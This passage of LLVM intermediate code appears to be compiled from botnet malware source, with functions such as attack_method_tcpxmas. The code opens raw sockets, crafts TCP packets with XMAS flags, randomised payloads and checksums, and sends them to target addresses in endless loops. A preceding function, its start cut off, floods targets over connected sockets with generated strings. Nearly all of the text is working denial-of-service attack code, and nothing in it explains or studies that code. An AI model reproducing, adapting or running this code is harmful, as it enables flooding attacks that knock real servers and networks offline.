  %10 = sext i8 %9 to i64
  %11 = tail call signext i8 @random_hex()
  %12 = sext i8 %11 to i64
  %13 = add nsw i64 %12, %10
  %14 = getelementptr inbounds [31 x i8], [31 x i8]* @.str.2, i64 0, i64 %13
  store i8* %14, i8** %8, align 8
  %15 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 2
  %16 = tail call signext i8 @random_hex()
  %17 = sext i8 %16 to i64
  %18 = tail call signext i8 @random_hex()
  %19 = sext i8 %18 to i64
  %20 = add nsw i64 %19, %17
  %21 = getelementptr inbounds [31 x i8], [31 x i8]* @.str.3, i64 0, i64 %20
  store i8* %21, i8** %15, align 16
  %22 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 3
  %23 = bitcast i8** %22 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i64 0, i64 0)>, <2 x i8*>* %23, align 8
  %24 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 5
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8** %24, align 8
  %25 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 6
  %26 = tail call signext i8 @random_hex()
  %27 = sext i8 %26 to i64
  %28 = tail call signext i8 @random_hex()
  %29 = sext i8 %28 to i64
  %30 = add nsw i64 %29, %27
  %31 = tail call signext i8 @random_hex()
  %32 = sext i8 %31 to i64
  %33 = add nsw i64 %30, %32
  %34 = tail call signext i8 @random_hex()
  %35 = sext i8 %34 to i64
  %36 = add nsw i64 %33, %35
  %37 = tail call signext i8 @random_hex()
  %38 = sext i8 %37 to i64
  %39 = add nsw i64 %36, %38
  %40 = tail call signext i8 @random_hex()
  %41 = sext i8 %40 to i64
  %42 = add nsw i64 %39, %41
  %43 = tail call signext i8 @random_hex()
  %44 = sext i8 %43 to i64
  %45 = add nsw i64 %42, %44
  %46 = tail call signext i8 @random_hex()
  %47 = sext i8 %46 to i64
  %48 = add i64 %45, %47
  %49 = tail call signext i8 @random_hex()
  %50 = sext i8 %49 to i64
  %51 = add i64 %48, %50
  %52 = tail call signext i8 @random_hex()
  %53 = sext i8 %52 to i64
  %54 = add i64 %51, %53
  %55 = tail call signext i8 @random_hex()
  %56 = sext i8 %55 to i64
  %57 = add i64 %54, %56
  %58 = tail call signext i8 @random_hex()
  %59 = sext i8 %58 to i64
  %60 = add i64 %57, %59
  %61 = tail call signext i8 @random_hex()
  %62 = sext i8 %61 to i64
  %63 = add i64 %60, %62
  %64 = tail call signext i8 @random_hex()
  %65 = sext i8 %64 to i64
  %66 = add i64 %63, %65
  %sext = shl i64 %66, 32
  %67 = ashr exact i64 %sext, 32
  %68 = getelementptr inbounds [1 x i8], [1 x i8]* @.str.6, i64 0, i64 %67
  store i8* %68, i8** %25, align 16
  %69 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 7
  %70 = bitcast i8** %69 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0)>, <2 x i8*>* %70, align 8
  %71 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 9
  %72 = bitcast i8** %71 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.10, i64 0, i64 0)>, <2 x i8*>* %72, align 8
  %73 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 11
  %74 = bitcast i8** %73 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i64 0, i64 0)>, <2 x i8*>* %74, align 8
  %75 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 13
  %76 = bitcast i8** %75 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.14, i64 0, i64 0)>, <2 x i8*>* %76, align 8
  %77 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 15
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0), i8** %77, align 8
  %78 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 16
  %79 = bitcast i8** %78 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.17, i64 0, i64 0)>, <2 x i8*>* %79, align 16
  %80 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 18
  %81 = bitcast i8** %80 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([174 x i8], [174 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.19, i64 0, i64 0)>, <2 x i8*>* %81, align 16
  %82 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 20
  %83 = bitcast i8** %82 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([163 x i8], [163 x i8]* @.str.21, i64 0, i64 0)>, <2 x i8*>* %83, align 16
  %84 = zext i8 %0 to i64
  %85 = tail call noalias i8* @calloc(i64 %84, i64 4) #11
  %86 = bitcast i8* %85 to i32*
  %87 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %88 = trunc i32 %87 to i16
  %89 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %90 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1024)
  %91 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %92 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %92, i8 0, i64 16, i32 4, i1 false)
  %93 = and i32 %89, 65535
  %94 = icmp eq i32 %93, 65535
  br i1 %94, label %98, label %95

; <label>:95:                                     ; preds = %4
  %96 = trunc i32 %89 to i16
  %97 = tail call zeroext i16 @htons(i16 zeroext %96) #12
  br label %98

; <label>:98:                                     ; preds = %4, %95
  %.053 = phi i16 [ %97, %95 ], [ 0, %4 ]
  %99 = zext i8 %0 to i32
  %100 = icmp eq i8 %0, 0
  br i1 %100, label %.preheader, label %.lr.ph57

.lr.ph57:                                         ; preds = %98
  %101 = and i32 %87, 65535
  %102 = icmp eq i32 %101, 65535
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %106 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %107 = zext i8 %0 to i64
  br label %109

.preheader.loopexit:                              ; preds = %130
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %98
  %108 = icmp eq i8 %0, 0
  br label %.loopexit

; <label>:109:                                    ; preds = %.lr.ph57, %130
  %indvars.iv = phi i64 [ 0, %.lr.ph57 ], [ %indvars.iv.next, %130 ]
  br i1 %102, label %112, label %110

; <label>:110:                                    ; preds = %109
  %111 = call zeroext i16 @htons(i16 zeroext %88) #12
  br label %112

; <label>:112:                                    ; preds = %109, %110
  %.sink = phi i16 [ %111, %110 ], [ 0, %109 ]
  %113 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %114 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %114, align 2
  %115 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %116 = getelementptr inbounds i32, i32* %86, i64 %indvars.iv
  store i32 %115, i32* %116, align 4
  %117 = icmp eq i32 %115, -1
  br i1 %117, label %118, label %119

; <label>:118:                                    ; preds = %112
  ret void

; <label>:119:                                    ; preds = %112
  store i16 2, i16* %103, align 4
  store i16 %.053, i16* %104, align 2
  store i32 0, i32* %105, align 4
  %120 = call i32 @bind(i32 %115, %struct.sockaddr* nonnull %106, i32 16) #11
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = icmp ult i8 %122, 32
  br i1 %123, label %124, label %130

; <label>:124:                                    ; preds = %119
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %126 = load i32, i32* %125, align 4
  %127 = call i32 @ntohl(i32 %126) #12
  %128 = call i32 @htonl(i32 %127) #12
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %128, i32* %129, align 4
  br label %130

; <label>:130:                                    ; preds = %124, %119
  %131 = bitcast %struct.attack_target* %113 to %struct.sockaddr*
  %132 = call i32 @connect(i32 %115, %struct.sockaddr* %131, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %133 = icmp slt i64 %indvars.iv.next, %107
  br i1 %133, label %109, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %108, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.155 = phi i32 [ %.mux, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %134 = sext i32 %.155 to i64
  %135 = getelementptr inbounds i32, i32* %86, i64 %134
  %136 = load i32, i32* %135, align 4
  %137 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 %134
  %138 = load i8*, i8** %137, align 8
  %139 = call i64 @strlen(i8* %138) #14
  %140 = add i64 %139, 1
  %141 = call i64 @send(i32 %136, i8* %138, i64 %140, i32 16384) #11
  %142 = add nsw i32 %.155, 1
  %143 = icmp slt i32 %142, %99
  %.mux = select i1 %143, i32 %142, i32 0
  br label %.lr.ph
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @random_hex() local_unnamed_addr #0 {
  %1 = tail call i32 @rand() #11
  %2 = srem i32 %1, 257
  %3 = trunc i32 %2 to i8
  ret i8 %3
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #7

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #11
  %12 = bitcast i8* %11 to %struct.attack_xmas_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #11
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 1)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #11
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %82, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader153..preheader_crit_edge, label %.preheader151.lr.ph

.preheader153..preheader_crit_edge:               ; preds = %.preheader153
  %.pre165 = sext i32 %37 to i64
  %.pre166 = add nsw i64 %.pre165, 40
  br label %.preheader

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  %81 = or i16 %80, 128
  br label %.preheader151

; <label>:82:                                     ; preds = %42
  %83 = call i32 @close(i32 %40) #11
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %84 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %.loopexit152, label %.lr.ph161.preheader

.lr.ph161.preheader:                              ; preds = %.preheader151
  br label %.lr.ph161

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153..preheader_crit_edge
  %.pre-phi167 = phi i64 [ %.pre166, %.preheader153..preheader_crit_edge ], [ %62, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre165, %.preheader153..preheader_crit_edge ], [ %61, %.preheader.loopexit ]
  %86 = and i32 %17, 65535
  %87 = icmp eq i32 %86, 65535
  %88 = icmp eq i8 %39, 0
  %89 = add nsw i64 %.pre-phi, 20
  %90 = trunc i64 %89 to i16
  %91 = trunc i64 %89 to i32
  br label %.loopexit

.lr.ph161:                                        ; preds = %.lr.ph161.preheader, %.backedge
  %92 = phi i32 [ %187, %.backedge ], [ %84, %.lr.ph161.preheader ]
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i32 0) #11
  %94 = or i32 %93, 2048
  %95 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 4, i32 %94) #11
  store i16 2, i16* %48, align 4
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %97, i32 2
  %99 = load i8, i8* %98, align 4
  %100 = icmp ult i8 %99, 32
  %101 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %97, i32 1
  %102 = load i32, i32* %101, align 4
  br i1 %100, label %103, label %106

; <label>:103:                                    ; preds = %.lr.ph161
  %104 = call i32 @ntohl(i32 %102) #12
  %105 = call i32 @htonl(i32 %104) #12
  br label %106

; <label>:106:                                    ; preds = %.lr.ph161, %103
  %.sink = phi i32 [ %105, %103 ], [ %102, %.lr.ph161 ]
  store i32 %.sink, i32* %49, align 4
  br i1 %51, label %109, label %107

; <label>:107:                                    ; preds = %106
  %108 = call zeroext i16 @htons(i16 zeroext %24) #12
  br label %109

; <label>:109:                                    ; preds = %106, %107
  %.sink3 = phi i16 [ %108, %107 ], [ 0, %106 ]
  store i16 %.sink3, i16* %52, align 2
  %110 = call i32 @connect(i32 %92, %struct.sockaddr* nonnull %53, i32 16) #11
  %111 = call i64 @time(i64* null) #11
  br label %112

; <label>:112:                                    ; preds = %189, %109
  store i32 16, i32* %8, align 4
  %113 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #11
  %114 = trunc i64 %113 to i32
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %.loopexit150.loopexit, label %116

; <label>:116:                                    ; preds = %112
  %117 = load i32, i32* %56, align 4
  %118 = load i32, i32* %49, align 4
  %119 = icmp eq i32 %117, %118
  br i1 %119, label %120, label %189

; <label>:120:                                    ; preds = %116
  %sext = shl i64 %113, 32
  %121 = ashr exact i64 %sext, 32
  %122 = icmp ugt i64 %121, 40
  br i1 %122, label %123, label %189

; <label>:123:                                    ; preds = %120
  %124 = load i16, i16* %58, align 4
  %125 = load i16, i16* %52, align 2
  %126 = icmp eq i16 %124, %125
  br i1 %126, label %127, label %189

; <label>:127:                                    ; preds = %123
  %128 = load i16, i16* %60, align 16
  %129 = and i16 %128, 4608
  %130 = icmp eq i16 %129, 4608
  br i1 %130, label %131, label %182

; <label>:131:                                    ; preds = %127
  %132 = load i32, i32* %5, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %133, i32 0
  store i32 %117, i32* %134, align 4
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %136 = load i32, i32* %135, align 4
  %137 = call i32 @ntohl(i32 %136) #12
  %138 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %133, i32 1
  store i32 %137, i32* %138, align 4
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %140 = load i32, i32* %139, align 4
  %141 = call i32 @ntohl(i32 %140) #12
  %142 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %133, i32 2
  store i32 %141, i32* %142, align 4
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %144 = load i16, i16* %143, align 2
  %145 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %133, i32 3
  store i16 %144, i16* %145, align 4
  %146 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %133, i32 4
  store i16 %124, i16* %146, align 2
  %147 = call noalias i8* @malloc(i64 %62) #11
  %148 = getelementptr inbounds i8*, i8** %14, i64 %133
  store i8* %147, i8** %148, align 8
  %149 = getelementptr inbounds i8, i8* %147, i64 20
  %150 = bitcast i8* %149 to %struct.tcphdr*
  %151 = getelementptr inbounds i8, i8* %147, i64 40
  store i8 69, i8* %147, align 4
  %152 = getelementptr inbounds i8, i8* %147, i64 1
  store i8 %16, i8* %152, align 1
  %153 = call zeroext i16 @htons(i16 zeroext %63) #12
  %154 = getelementptr inbounds i8, i8* %147, i64 2
  %155 = bitcast i8* %154 to i16*
  store i16 %153, i16* %155, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %18) #12
  %157 = getelementptr inbounds i8, i8* %147, i64 4
  %158 = bitcast i8* %157 to i16*
  store i16 %156, i16* %158, align 4
  %159 = getelementptr inbounds i8, i8* %147, i64 8
  store i8 %20, i8* %159, align 4
  br i1 %64, label %164, label %160

; <label>:160:                                    ; preds = %131
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %162 = getelementptr inbounds i8, i8* %147, i64 6
  %163 = bitcast i8* %162 to i16*
  store i16 %161, i16* %163, align 2
  br label %164

; <label>:164:                                    ; preds = %131, %160
  %165 = getelementptr inbounds i8, i8* %147, i64 9
  store i8 6, i8* %165, align 1
  %166 = load i32, i32* @LOCAL_ADDR, align 4
  %167 = getelementptr inbounds i8, i8* %147, i64 12
  %168 = bitcast i8* %167 to i32*
  store i32 %166, i32* %168, align 4
  %169 = getelementptr inbounds i8, i8* %147, i64 16
  %170 = bitcast i8* %169 to i32*
  store i32 %117, i32* %170, align 4
  %171 = bitcast i8* %149 to i16*
  store i16 %144, i16* %171, align 4
  %172 = getelementptr inbounds i8, i8* %147, i64 22
  %173 = bitcast i8* %172 to i16*
  store i16 %124, i16* %173, align 2
  %174 = getelementptr inbounds i8, i8* %147, i64 24
  %175 = bitcast i8* %174 to i32*
  store i32 %141, i32* %175, align 4
  %176 = getelementptr inbounds i8, i8* %147, i64 28
  %177 = bitcast i8* %176 to i32*
  store i32 %137, i32* %177, align 4
  %178 = getelementptr inbounds i8, i8* %147, i64 32
  %179 = bitcast i8* %178 to i16*
  %180 = getelementptr inbounds i8, i8* %147, i64 34
  %181 = bitcast i8* %180 to i16*
  store i16 0, i16* %181, align 2
  store i16 %81, i16* %179, align 4
  call void @rand_str(i8* %151, i32 %37)
  br label %.loopexit152

; <label>:182:                                    ; preds = %127
  %183 = and i16 %128, 1280
  %184 = icmp eq i16 %183, 0
  br i1 %184, label %189, label %185

; <label>:185:                                    ; preds = %182
  %186 = call i32 @close(i32 %92) #11
  br label %.backedge

.backedge:                                        ; preds = %185, %193
  %187 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %188 = icmp eq i32 %187, -1
  br i1 %188, label %.loopexit152.loopexit, label %.lr.ph161

; <label>:189:                                    ; preds = %182, %123, %120, %116
  %190 = call i64 @time(i64* null) #11
  %191 = sub nsw i64 %190, %111
  %192 = icmp sgt i64 %191, 10
  br i1 %192, label %193, label %112

; <label>:193:                                    ; preds = %189
  %194 = call i32 @close(i32 %92) #11
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit, %.preheader151, %164
  %.1 = phi %struct.tcphdr* [ %150, %164 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ]
  %195 = load i32, i32* %5, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %5, align 4
  %197 = icmp slt i32 %196, %46
  br i1 %197, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %209
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %209
  %storemerge139160 = phi i32 [ %243, %209 ], [ 0, %.lr.ph.preheader ]
  %198 = sext i32 %storemerge139160 to i64
  %199 = getelementptr inbounds i8*, i8** %14, i64 %198
  %200 = load i8*, i8** %199, align 8
  %201 = bitcast i8* %200 to %struct.iphdr*
  %202 = getelementptr inbounds i8, i8* %200, i64 20
  %203 = getelementptr inbounds i8, i8* %200, i64 40
  br i1 %87, label %204, label %207

; <label>:204:                                    ; preds = %.lr.ph
  %205 = getelementptr inbounds i8, i8* %200, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 0, i16* %206, align 4
  br label %207

; <label>:207:                                    ; preds = %204, %.lr.ph
  br i1 %88, label %209, label %208

; <label>:208:                                    ; preds = %207
  call void @rand_str(i8* %203, i32 %37)
  %.pre = load i32, i32* %5, align 4
  br label %209

; <label>:209:                                    ; preds = %207, %208
  %210 = phi i32 [ %storemerge139160, %207 ], [ %.pre, %208 ]
  %211 = getelementptr inbounds i8, i8* %200, i64 10
  %212 = bitcast i8* %211 to i16*
  store i16 0, i16* %212, align 2
  %213 = bitcast i8* %200 to i16*
  %214 = call zeroext i16 @checksum_generic(i16* %213, i32 20)
  store i16 %214, i16* %212, align 2
  %215 = sext i32 %210 to i64
  %216 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %215, i32 1
  %217 = load i32, i32* %216, align 4
  %218 = add i32 %217, 1
  store i32 %218, i32* %216, align 4
  %219 = trunc i32 %217 to i16
  %220 = call zeroext i16 @htons(i16 zeroext %219) #12
  %221 = zext i16 %220 to i32
  %222 = getelementptr inbounds i8, i8* %200, i64 24
  %223 = bitcast i8* %222 to i32*
  store i32 %221, i32* %223, align 4
  %224 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %215, i32 2
  %225 = load i32, i32* %224, align 4
  %226 = trunc i32 %225 to i16
  %227 = call zeroext i16 @htons(i16 zeroext %226) #12
  %228 = zext i16 %227 to i32
  %229 = getelementptr inbounds i8, i8* %200, i64 28
  %230 = bitcast i8* %229 to i32*
  store i32 %228, i32* %230, align 4
  %231 = getelementptr inbounds i8, i8* %200, i64 36
  %232 = bitcast i8* %231 to i16*
  store i16 0, i16* %232, align 4
  %233 = call zeroext i16 @htons(i16 zeroext %90) #12
  %234 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %201, i8* %202, i16 zeroext %233, i32 %91)
  store i16 %234, i16* %232, align 4
  %235 = getelementptr inbounds i8, i8* %200, i64 22
  %236 = bitcast i8* %235 to i16*
  %237 = load i16, i16* %236, align 2
  %238 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %215, i32 0, i32 1
  store i16 %237, i16* %238, align 2
  %239 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %215, i32 0
  %240 = bitcast %struct.sockaddr_in* %239 to %struct.sockaddr*
  %241 = call i64 @sendto(i32 %40, i8* %200, i64 %.pre-phi167, i32 16384, %struct.sockaddr* %240, i32 16) #11
  %242 = load i32, i32* %5, align 4
  %243 = add nsw i32 %242, 1
  store i32 %243, i32* %5, align 4
  %244 = icmp slt i32 %243, %46
  br i1 %244, label %.lr.ph, label %.loopexit.loopexit

.loopexit150.loopexit:                            ; preds = %112
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %4, %82
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
